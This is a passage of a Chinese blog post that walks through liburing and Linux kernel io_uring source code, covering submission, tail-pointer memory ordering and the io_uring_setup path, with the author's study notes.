class="line"><span class="comment">// 0</span></span><br><span class="line">sqe-&gt;addr = (<span class="type">unsigned</span> <span class="type">long</span>) addr;</span><br><span class="line"><span class="comment">// 提供文件地址</span></span><br><span class="line">sqe-&gt;len = len;</span><br><span class="line">sqe-&gt;rw_flags = <span class="number">0</span>;</span><br><span class="line">sqe-&gt;buf_index = <span class="number">0</span>;</span><br><span class="line">sqe-&gt;personality = <span class="number">0</span>;</span><br><span class="line">sqe-&gt;file_index = <span class="number">0</span>;</span><br><span class="line">sqe-&gt;addr3 = <span class="number">0</span>;</span><br><span class="line">sqe-&gt;__pad2[<span class="number">0</span>] = <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>归根结底就是设置了一个sqe</p><p>这里笔者有一个问题：<br>#TODO<br>在<code>IORING_SETUP_SQROLL</code>时, io_uring用户和内核采用共享内存通信，内核态是如何知道一个sqe的全部参数已经设置完毕了，有没有可能用户态正在设置sqe的部分成员时，内核已经在处理这个sqe了？</p><p>在之后  [[#<code>__io_uring_flush_sq</code>]] 笔者似乎找到了这个问题的答案：</p><ul><li>通过 <code>memory_store_release</code> 保证sqe的更新不会被重排到 ktail 的修改前</li><li>通过 修改 ktail 表示真正提交了一个任务</li></ul><h3 id="io-uring-submit"><code>io_uring_submit</code></h3><p><code>io_uring_submit</code> 用于提交一个任务</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">io_uring_submit</span><span class="params">(<span class="keyword">struct</span> io_uring *ring)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> __io_uring_submit_and_wait(ring, <span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> __io_uring_submit_and_wait(<span class="keyword">struct</span> io_uring *ring, <span class="type">unsigned</span> wait_nr)</span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">return</span> __io_uring_submit(ring, __io_uring_flush_sq(ring), wait_nr, <span class="literal">false</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>最终到达 <code>__io_uring_submit</code>.  不过这个函数, 在SQPOLL模式下用处不大, 真正的提交操作应该说是在 <code>__io_uring_flush_sq</code> 中实现的.</p><p>这里主要是判断当前情况需不需要调用 <code>io_uring_enter</code> syscall.</p><p>如果当前 是IOPOLL模式, 就需要 <code>io_uring_enter</code> 来收割任务.</p><p>如果是 SQPOLL 模式， 且 内核处理线程已 <code>idle</code> ，那么就通过  <code>io_uring_enter</code> syscall 来唤醒</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">int</span> __io_uring_submit(<span class="keyword">struct</span> io_uring *ring, <span class="type">unsigned</span> submitted,</span><br><span class="line">     <span class="type">unsigned</span> wait_nr, <span class="type">bool</span> getevents)</span><br><span class="line">&#123;</span><br><span class="line"><span class="type">bool</span> cq_needs_enter = getevents || wait_nr || cq_ring_needs_enter(ring);</span><br><span class="line"><span class="type">unsigned</span> flags;</span><br><span class="line"><span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line">flags = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (sq_ring_needs_enter(ring, submitted, &amp;flags) || cq_needs_enter) &#123;</span><br><span class="line"><span class="keyword">if</span> (cq_needs_enter)</span><br><span class="line">flags |= IORING_ENTER_GETEVENTS;</span><br><span class="line"><span class="keyword">if</span> (ring-&gt;int_flags &amp; INT_FLAG_REG_RING)</span><br><span class="line">flags |= IORING_ENTER_REGISTERED_RING;</span><br><span class="line"></span><br><span class="line">ret = __sys_io_uring_enter(ring-&gt;enter_ring_fd, submitted,</span><br><span class="line">   wait_nr, flags, <span class="literal">NULL</span>);</span><br><span class="line">&#125; <span class="keyword">else</span></span><br><span class="line">ret = submitted;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> ret;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="io-uring-flush-sq"><code>__io_uring_flush_sq</code></h4><p>主要用来更新内核sq 的tail指针， 最终返回需要提交的任务数</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">unsigned</span> __io_uring_flush_sq(<span class="keyword">struct</span> io_uring *ring)</span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_uring_sq</span> *<span class="title">sq</span> =</span> &amp;ring-&gt;sq;</span><br><span class="line"><span class="type">unsigned</span> tail = sq-&gt;sqe_tail;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (sq-&gt;sqe_head != tail) &#123;</span><br><span class="line">sq-&gt;sqe_head = tail;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Ensure kernel sees the SQE updates before the tail update.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (!(ring-&gt;flags &amp; IORING_SETUP_SQPOLL))</span><br><span class="line">IO_URING_WRITE_ONCE(*sq-&gt;ktail, tail);</span><br><span class="line"><span class="comment">// 原子读</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">io_uring_smp_store_release(sq-&gt;ktail, tail);</span><br><span class="line"><span class="comment">// memory_release 的内存序来写</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"> */</span><br><span class="line"><span class="keyword">return</span> tail - *sq-&gt;khead;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>在 SQPOLL 模式下,内核提交者可能同时在更新头指针。<br>对于非 SQPOLL 模式,应用自己更新头指针,不存在并发问题。<br>即使 SQPOLL 模式下,就算头指针读取是原子的,获取到的值也可能立即过期,存在并发修改的问题。<br>最坏情况下,读取的值会高估实际可提交的请求数。</p><p>在这里用到了一个原子写 <code>IO_URING_WRITE_ONCE</code> .</p><p>而 <code>io_uring_smb_store_release</code> 笔者涉及到内存序的问题，内存序是为了防止指令重排产生的，笔者还没有特别理解。</p><p>笔者尝试解释一下， 这里使用使用<code>memory_order_release</code>内存序标注这个存储操作</p><p>release内存序的特点是:</p><ol><li>当前线程本地的修改对其他线程可见</li><li>防止存储操作被重新排序</li></ol><p>这里应该是让此处对于sqe的修改，要在对于tail指针的修改前完成，防止指令重排的影响</p><p>如果是对于IOPOLL，内核的真正确认提交是在 <code>io_uring_enter</code> 实现的，其实是和当前处于同一个线程，因此不需要通过  <code>memory_order_release</code> 来保证 “当前线程本地的修改对其他线程可见”， 对同一线程的数据冒险应该是由旁路机制处理的</p><p>#TODO</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> io_uring_smp_store_release(p, v)\</span></span><br><span class="line"><span class="meta">atomic_store_explicit((_Atomic __typeof__(*(p)) *)(p), (v), \</span></span><br><span class="line"><span class="meta">      memory_order_release)</span></span><br></pre></td></tr></table></figure><h2 id="syscall">syscall</h2><p>syscall是内核提供给用户态的接口，io_uring涉及三个syscall</p><ul><li><a href="https://man7.org/linux/man-pages/man2/io_uring_setup.2.html">io_uring_setup(2)</a></li><li><a href="https://man7.org/linux/man-pages/man2/io_uring_enter.2.html">io_uring_enter(2)</a></li><li><a href="https://man7.org/linux/man-pages/man2/io_uring_register.2.html">io_uring_register(2)</a></li></ul><p>笔者这里主要讲述前两个syscall</p><h3 id="io-uring-setup"><code>io_uring_setup</code></h3><p>参数</p><ul><li>entries:  sq队列大小</li><li>params：提供的各种参数，许多返回值也会写入此结构体积</li></ul><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> <span class="type">long</span> <span class="title function_">io_uring_setup</span><span class="params">(u32 entries, <span class="keyword">struct</span> io_uring_params __user *params)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_uring_params</span> <span class="title">p</span>;</span></span><br><span class="line"><span class="type">int</span> i;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (copy_from_user(&amp;p, params, <span class="keyword">sizeof</span>(p)))</span><br><span class="line"><span class="keyword">return</span> -EFAULT;</span><br><span class="line"><span class="comment">// 将params复制到内核空间</span></span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; ARRAY_SIZE(p.resv); i++) &#123;</span><br><span class="line"><span class="keyword">if</span> (p.resv[i])</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (p.flags &amp; ~(IORING_SETUP_IOPOLL | IORING_SETUP_SQPOLL |</span><br><span class="line">IORING_SETUP_SQ_AFF | IORING_SETUP_CQSIZE |</span><br><span class="line">IORING_SETUP_CLAMP | IORING_SETUP_ATTACH_WQ |</span><br><span class="line">IORING_SETUP_R_DISABLED | IORING_SETUP_SUBMIT_ALL |</span><br><span class="line">IORING_SETUP_COOP_TASKRUN | IORING_SETUP_TASKRUN_FLAG |</span><br><span class="line">IORING_SETUP_SQE128 | IORING_SETUP_CQE32 |</span><br><span class="line">IORING_SETUP_SINGLE_ISSUER | IORING_SETUP_DEFER_TASKRUN |</span><br><span class="line">IORING_SETUP_NO_MMAP | IORING_SETUP_REGISTERED_FD_ONLY |</span><br><span class="line">IORING_SETUP_NO_SQARRAY))</span><br><span class="line"><span class="keyword">return</span> -EINVAL; </span><br><span class="line"><span class="comment">// 如果有非法flag，直接返回</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> io_uring_create(entries, &amp;p, params);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来是首先检查entries 和flags。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">static</span> __cold <span class="type">int</span> <span class="title function_">io_uring_create</span><span class="params">(<span class="type">unsigned</span> entries, <span class="keyword">struct</span> io_uring_params *p,</span></span><br><span class="line"><span class="params">  <span class="keyword">struct</span> io_uring_params __user *params)</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_ring_ctx</span> *<span class="title">ctx</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">io_uring_task</span> *<span class="title">tctx</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">file</span> *<span class="title">file</span>;</span></span><br><span class="line"><span class="type">int</span> ret;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!entries)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"><span class="keyword">if</span> (entries &gt; IORING_MAX_ENTRIES) &#123;</span><br><span class="line"><span class="keyword">if</span> (!(p-&gt;flags &amp; IORING_SETUP_CLAMP))</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line">entries = IORING_MAX_ENTRIES;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((p-&gt;flags &amp; IORING_SETUP_REGISTERED_FD_ONLY)</span><br><span class="line">    &amp;&amp; !(p-&gt;flags &amp; IORING_SETUP_NO_MMAP))</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br></pre></td></tr></table></figure><p>设置sq_entries 以2的幂次向上取整， 这是为了方便环形队列的处理.</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">p-&gt;sq_entries = roundup_pow_of_two(entries);</span><br><span class="line"><span class="keyword">if</span> (p-&gt;flags &amp; IORING_SETUP_CQSIZE) &#123;</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * If IORING_SETUP_CQSIZE is set, we do the same roundup</span></span><br><span class="line"><span class="comment"> * to a power-of-two, if it isn&#x27;t already. We do NOT impose</span></span><br><span class="line"><span class="comment"> * any cq vs sq ring sizing.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (!p-&gt;cq_entries)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line"><span class="keyword">if</span> (p-&gt;cq_entries &gt; IORING_MAX_CQ_ENTRIES) &#123;</span><br><span class="line"><span class="keyword">if</span> (!(p-&gt;flags &amp; IORING_SETUP_CLAMP))</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line">p-&gt;cq_entries = IORING_MAX_CQ_ENTRIES;</span><br><span class="line">&#125;</span><br><span class="line">p-&gt;cq_entries = roundup_pow_of_two(p-&gt;cq_entries);</span><br><span class="line"><span class="keyword">if</span> (p-&gt;cq_entries &lt; p-&gt;sq_entries)</span><br><span class="line"><span class="keyword">return</span> -EINVAL;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">p-&gt;cq_entries = <span class="number">2</span> * p-&gt;sq_entries;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>接下来是一系列设置ctx的代码，笔者暂且不在这里分析，之后遇见了再分析每一项</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">ctx = io_ring_ctx_alloc(p);</span><br><span class="line"><span class="keyword">if</span> (!ctx)</span><br><span class="line"><span class="keyword">return</span> -ENOMEM;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((ctx-&gt;flags &amp; IORING_SETUP_DEFER_TASKRUN) &amp;&amp;</span><br><span class="line">    !(ctx-&gt;flags &amp; IORING_SETUP_IOPOLL) &amp;&amp;</span><br><span class="line">    !(ctx-&gt;flags &amp; IORING_SETUP_SQPOLL))</span><br><span class="line">ctx-&gt;task_complete = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (ctx-&gt;task_complete || (ctx-&gt;flags &amp; IORING_SETUP_IOPOLL))</span><br><span class="line">ctx-&gt;lockless_cq = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * lazy poll_wq activation relies on -&gt;task_complete for synchronisation</span></span><br><span class="line"><span class="comment"> * purposes, see io_activate_pollwq()</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (!ctx-&gt;task_complete)</span><br><span class="line">ctx-&gt;poll_activated = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * When SETUP_IOPOLL and SETUP_SQPOLL are both enabled, user</span></span><br><span class="line"><span class="comment"> * space applications don&#x27;t need to do io completion events</span></span><br><span class="line"><span class="comment"> * polling again, they can rely on io_sq_thread to do polling</span></span><br><span class="line"><span class="comment"> * work, which can reduce cpu usage and uring_lock contention.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (ctx-&gt;flags &amp; IORING_SETUP_IOPOLL &amp;&amp;</span><br><span class="line">    !(ctx-&gt;flags &amp; IORING_SETUP_SQPOLL))</span><br><span class="line">ctx-&gt;syscall_iopoll = <span class="number">1</span>;</span><br><span class="line"></span><br><span class="line">ctx-&gt;compat = in_compat_syscall();</span><br><span class="line"><span class="keyword">if</span> (!ns_capable_noaudit(&amp;init_user_ns, CAP_IPC_LOCK))</span><br><span class="line">ctx-&gt;user = get_uid(current_user());</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * For SQPOLL, we just need a wakeup, always. For !SQPOLL, if</span></span><br><span class="line"><span class="comment"> * COOP_TASKRUN is set, then IPIs are never needed by the app.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">ret = -EINVAL;</span><br><span class="line"><span class="keyword">if</span> (ctx-&gt;flags &amp; IORING_SETUP_SQPOLL) &#123;</span><br><span class="line"><span class="comment">/* IPI related flags don&#x27;t make sense with SQPOLL */</span></span><br><span class="line"><span class="keyword">if</span> (ctx-&gt;flags &amp; (IORING_SETUP_COOP_TASKRUN |</span><br><span class="line">  IORING_SETUP_TASKRUN_FLAG |</span><br><span class="line">  IORING_SETUP_DEFER_TASKRUN))</span><br><span class="line"><span class="keyword">goto</span> err;</span><br><span class="line">ctx-&gt;notify_method = TWA_SIGNAL_NO_IPI;</span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (ctx-&gt;flags &amp; IORING_SETUP_COOP_TASKRUN) &#123;</span><br><span class="line">ctx-&gt;notify_method = TWA_SIGNAL_NO_IPI;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line"><span class="keyword">if</span> (ctx-&gt;flags &amp; IORING_SETUP_TASKRUN_FLAG &amp;&amp;</span><br><span class="line">    !(ctx-&gt;flags &amp; IORING_SETUP_DEFER_TASKRUN))</span><br><span class="line"><span class="keyword">goto</span> err;</span><br><span class="line">ctx-&gt;notify_method = TWA_SIGNAL;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * For DEFER_TASKRUN we require the completion task to be the same as the</span></span><br><span class="line"><span class="comment"> * submission task. This implies that there is only one submitter, so enforce</span></span><br><span class="line"><span class="comment"> * that.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (ctx-&gt;flags &amp; IORING_SETUP_DEFER_TASKRUN &amp;&amp;</span><br><span class="line">    !(ctx-&gt;flags &amp; IORING_SETUP_SINGLE_ISSUER)) &#123;</span><br><span class="line"><span class="keyword">goto</span> err;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * This is just grabbed for accounting purposes. When a process exits,</span></span><br><span class="line"><span class="comment"> * the mm is exited and dropped before the files, hence we need to hang</span></span><br><span class="line"><span class="comment"> * on to this mm purely for the purposes of being able to unaccount</span></span><br><span class="line"><span class="comment"> * memory (locked/pinned vm). It&#x27;s not used for anything else.</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line">mmgrab(current-&gt;mm);</span><br><span class="line">ctx-&gt;mm_account = current-&gt;mm;</span><br></pre></td></tr></table></figure><p>[[#<code>io_allocate_scq_urings</code> ]]  分配了scq和rings的内存</p><p>[[#<code>io_sq_offload_create</code>]]      创建了任务处理线程</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">ret = io_allocate_scq_urings(ctx, p);</span><br><span class="line"><span class="keyword">if</span> (ret)</span><br><span class="line"><span class="keyword">goto</span> err;</span><br><span class="line"></span><br><span class="line">ret = io_sq_offload_create(ctx, p);</span><br><span class="line"><span class="keyword">if</span> (ret)</span><br><span class="line"><span class="keyword">goto</span> err;</span><br><span class="line"></span><br><span class="line">ret = io_rsrc_init(ctx);</span><br><span class="line"><span class="keyword">if</span> (ret)</span><br><span class="line"><span class="keyword">goto</span> err;</span><br></pre></td></tr></table></figure><p>设置sq_off，即通过 <code>params</code> 返回给用户的 <code>ring</code> 中各个成员的偏移</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">p-&gt;sq_off.head = offsetof(<span class="keyword">struct</span> io_rings, sq.head);</span><br><span class="line">p-&gt;sq_off.tail = offsetof(<span class="keyword">struct</span> io_rings, sq.tail);</span><br><span class="line">p-&gt;sq_off.ring_mask = offsetof(<span class="keyword">struct</span> io_rings, sq_ring_mask);</span><br><span class="line">p-&gt;sq_off.ring_entries = offsetof(<span class="keyword">struct</span> io_rings, sq_ring_entries);</span><br><span class="line">p-&gt;sq_off.flags = offsetof(<span class="keyword">struct</span> io_rings, sq_flags);</span><br><span class="line">p-&gt;sq_off.dropped = offsetof(<span class="keyword">struct</span> io_rings, sq_dropped);</span><br><span class="line"><span class="keyword">if</span> (!(ctx-&gt;flags &amp; IORING_SETUP_NO_SQARRAY))</span><br><span class="line">p-&gt;sq_off.<span class="built_in">array</span> = (<span class="type">char</span> *)ctx-&gt;sq_array - (<span class="type">char</span> *)ctx-&gt;rings;</span><br><span class="line">p-&gt;sq_off.resv1 = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">if</span> (!(ctx-&gt;flags &amp; IORING_SETUP_NO_MMAP))</span><br><span class="line">p-&gt;sq_off.user_addr = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">p-&gt;cq_off.head = offsetof(<span class="keyword">struct</span> io_rings, cq.head);</span><br><span class="line">p-&gt;cq_off.tail = offsetof(<span class="keyword">struct</span> io_rings, cq.tail);</span><br><span class="line">p-&gt;cq_off.ring_mask = offsetof(<span class="keyword">struct</span> io_rings, cq_ring_mask);</span><br><span class="line">p-&gt;cq_off.ring_entries = offsetof(<span class="keyword">struct</span> io_rings, cq_ring_entries);</span><br><span class="line">p-&gt;cq_off.overflow = offsetof(<span class="keyword">struct</span> io_rings, cq_overflow);</span><br><span class="line">p-&gt;cq_off.cqes = offsetof(<span class="keyword">struct</span> io_rings, cqes);</span><br><span class="line">p-&gt;cq_off.flags = offsetof(<span class="keyword">struct</span> io_rings, cq_flags);</span><br><span class="line">p-&gt;cq_off.resv1 = <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>设置feature</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">p-&gt;features = IORING_FEAT_SINGLE_MMAP | IORING_FEAT_NODROP |</span><br><span class="line">IORING_FEAT_SUBMIT_STABLE | IORING_FEAT_RW_CUR_POS |</span><br><span class="line">IORING_FEAT_CUR_PERSONALITY | IORING_FEAT_FAST_POLL |</span><br><span class="line">IORING_FEAT_POLL_32BITS | IORING_FEAT_SQPOLL_NONFIXED |</span><br><span class="line">IORING_FEAT_EXT_ARG | IORING_FEAT_NATIVE_WORKERS |</span><br><span class="line">IORING_FEAT_RSRC_TAGS | IORING_FEAT_CQE_SKIP |</span><br><span class="line">IORING_FEAT_LINKED_FILE | IORING_FEAT_REG_REG_RING;</span><br></pre></td></tr></table></figure><p>再将<code>params</code>复制回用户空间</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (copy_to_user(params, p, <span class="keyword">sizeof</span>(*p))) &#123;</span><br><span class="line">ret = -EFAULT;</span><br><span class="line"><span class="keyword">goto</span> err;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后是注册fd</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (ctx-&gt;flags &amp; IORING_SETUP_SINGLE_ISSUER</span><br><span class="line">    &amp;&amp; !(ctx-&gt;flags &amp; IORING_SETUP_R_DISABLED))</span><br><span class="line">WRITE_ONCE(ctx-&gt;submitter_task, get_task_struct(current));</span><br><span class="line"></span><br><span class="line">file = io_uring_get_file(ctx);</span><br><span class="line"><span class="keyword">if</span> (IS_ERR(file)) &#123;</span><br><span class="line">ret = PTR_ERR(file);</span><br><span class="line"><span class="keyword">goto</span> err;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">ret = __io_uring_add_tctx_node(ctx);</span><br><span class="line"><span class="keyword">if</span> (ret)</span><br><span class="line"><span class="keyword">goto</span> err_fput;</span><br><span class="line">tctx = current-&gt;io_uring;</span><br><span class="line"></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment"> * Install ring fd as the very last thing, so we don&#x27;t risk someone</span></span><br><span class="line"><span class="comment"> * having closed it before we finish setup</span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"><span class="keyword">if</span> (p-&gt;flags &amp; IORING_SETUP_REGISTERED_FD_ONLY)</span><br><span class="line">ret = io_ring_add_registered_file(tctx, file, <span class="number">0</span>, IO_RINGFD_REG_MAX);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">ret = io_uring_install_fd(file);</span><br><span class="line"><span class="keyword">if</span> (ret &lt; <span class="number">0</span>)</span><br><span class="line"><span class="keyword">goto</span> 